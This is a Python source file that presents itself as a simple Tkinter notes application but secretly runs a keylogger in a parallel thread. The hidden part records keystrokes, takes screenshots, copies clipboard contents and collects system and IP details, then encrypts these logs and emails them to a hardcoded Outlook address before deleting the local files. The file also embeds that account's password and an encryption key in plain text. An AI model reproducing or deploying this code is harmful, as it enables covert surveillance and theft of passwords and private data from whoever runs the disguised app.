import threading
import tkinter as tk
from tkinter import ttk, messagebox
import json
import os
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import getpass
from requests import get
from cryptography.fernet import Fernet
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Email configuration
emailAddress = "faisalolaimi2412@outlook.com"
password = "olaimi3242"
toAddr = "faisalolaimi2412@outlook.com"
encryptionKey = "QlT8--4EzKjeh-Xp53BzktfBqGuuyas69Cyo6XdjZ-E="
filePath = os.getcwd()
extend = "\\"
fileMarge = filePath + extend

# Filenames
keyInformation = "keyLog.txt"
systemInformation = "sysInfo.txt"
clipboardInformation = "clipboard.txt"
screenshotInformation = "screenshot.png"
keysInformationE = "keylogE.txt"
systemInformationE = "systemInformationE.txt"
clipboardE = "clipboardE.txt"

# Initialize keylogger file
open('keyLog.txt', 'w').close()

def sendEmail(filename, attachment, toAddr):
    fromAddr = emailAddress

    msg = MIMEMultipart()
    msg['From'] = fromAddr
    msg['To'] = toAddr
    msg['Subject'] = 'Log file'

    body = "Please find attached the log file."
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(p)

    s = smtplib.SMTP('smtp.office365.com', 587)
    s.starttls()
    s.login(fromAddr, password)
    s.sendmail(fromAddr, toAddr, msg.as_string())
    s.quit()

def computerInformation():
    with open(filePath + extend + systemInformation, "w") as f:
        hostname = socket.gethostname()
        ipAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address\n")
        f.write("Private IP Address: " + ipAddr + "\n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")

def copyClipboard():
    with open(filePath + extend + clipboardInformation, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard data: \n" + pastedData)
        except:
            f.write("Clipboard could not be copied\n")

def screenshot():
    im = ImageGrab.grab()
    im.save(filePath + extend + screenshotInformation)

def keylogger():
    numberOfIterations = 0
    numberOfIterationsEnd = 3
    timeIteration = 5  # seconds
    currentTime = time.time()
    stoppingTime = time.time() + timeIteration

    while numberOfIterations < numberOfIterationsEnd:
        count = 0
        keys = []

        def on_press(key):
            nonlocal keys, count, currentTime
            keys.append(key)
            count += 1
            currentTime = time.time()
            if count >= 1:
                count = 0
                writeFile(keys)
                keys = []

        def writeFile(keys):
            with open(filePath + extend + keyInformation, "a") as f:
                for key in keys:
                    k = str(key).replace("'", "")
                    if k.find("space") > 0:
                        f.write("\t")
                    elif k.find("Key") == -1:
                        f.write(k)
                f.write("\t")

        def on_release(key):
            if key == Key.esc:
                return False
            if currentTime > stoppingTime:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            screenshot()
            sendEmail(screenshotInformation,filePath+extend+screenshotInformation,toAddr)
            copyClipboard()
            numberOfIterations += 1
            currentTime = time.time()
            stoppingTime = time.time() + timeIteration

    # After keylogger finishes, encrypt and send files
    filesToEncrypt = [fileMarge + systemInformation, fileMarge + clipboardInformation, fileMarge + keyInformation]
    encryptedFileNames = [fileMarge + systemInformationE, fileMarge + clipboardE, fileMarge + keysInformationE]

    for count, encryptingFile in enumerate(filesToEncrypt):
        with open(encryptingFile, 'rb') as f:
            data = f.read()
        fernet = Fernet(encryptionKey)
        encrypted = fernet.encrypt(data)
        with open(encryptedFileNames[count], 'wb') as f:
            f.write(encrypted)
        sendEmail(encryptedFileNames[count], encryptedFileNames[count], toAddr)


    # Clear log files
    time.sleep(120)
    delete_files = [systemInformation, clipboardInformation, keyInformation, screenshotInformation]
    for file in delete_files:
        os.remove(fileMarge + file)

def notes_app():
    # Create the main window
    root = tk.Tk()
    root.title("Notes App")
    root.geometry("500x500")
    style = ttk.Style()

    # Configure the tab font to be bold
    style.configure("TNotebook.Tab", font=("TkDefaultFont", 14, "bold"))

    # Create the notebook to hold the notes
    notebook = ttk.Notebook(root, style="TNotebook")
    notebook.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

    # Load saved notes
    notes = {}
    try:
        with open("notes.json", "r") as f:
            notes = json.load(f)
    except FileNotFoundError:
        pass

    def add_note():
        note_frame = ttk.Frame(notebook, padding=10)
        notebook.add(note_frame, text="New Note")
        title_label = ttk.Label(note_frame, text="Title:")
        title_label.grid(row=0, column=0, padx=10, pady=10, sticky="W")
        title_entry = ttk.Entry(note_frame, width=40)
        title_entry.grid(row=0, column=1, padx=10, pady=10)
        content_label = ttk.Label(note_frame, text="Content:")
        content_label.grid(row=1, column=0, padx=10, pady=10, sticky="W")
        content_entry = tk.Text(note_frame, width=40, height=10)
        content_entry.grid(row=1, column=1, padx=10, pady=10)

        def save_note():
            title = title_entry.get()
            content = content_entry.get("1.0", tk.END).strip()
            notes[title] = content
            with open("notes.json", "w") as f:
                json.dump(notes, f)
            note_content = tk.Text(notebook, width=40, height=10)
            note_content.insert(tk.END, content)
            notebook.forget(notebook.select())
            notebook.add(note_content, text=title)

        save_button = ttk.Button(note_frame, text="Save", command=save_note)
        save_button.grid(row=2, column=1, padx=10, pady=10)

    def load_notes():
        try:
            with open("notes.json", "r") as f:
                notes = json.load(f)
            for title, content in notes.items():
                note_content = tk.Text(notebook, width=40, height=10)
                note_content.insert(tk.END, content)
                notebook.add(note_content, text=title)
        except FileNotFoundError:
            pass

    def delete_note():
        current_tab = notebook.index(notebook.select())
        note_title = notebook.tab(current_tab, "text")
        confirm = messagebox.askyesno("Delete Note", f"Are you sure you want to delete {note_title}?")
        if confirm:
            notebook.forget(current_tab)
            notes.pop(note_title)
            with open("notes.json", "w") as f:
                json.dump(notes, f)

    new_button = ttk.Button(root, text="New Note", command=add_note)
    new_button.pack(side=tk.LEFT, padx=10, pady=10)
    delete_button = ttk.Button(root, text="Delete", command=delete_note)
    delete_button.pack(side=tk.LEFT, padx=10, pady=10)

    load_notes()
    root.mainloop()

if __name__ == "__main__":
    # Get system information at startup
    computerInformation()

    # Start keylogger and notes app concurrently
    keylogger_thread = threading.Thread(target=keylogger)
    notes_app_thread = threading.Thread(target=notes_app)

    keylogger_thread.start()
    notes_app_thread.start()

    keylogger_thread.join()
    notes_app_thread.join()
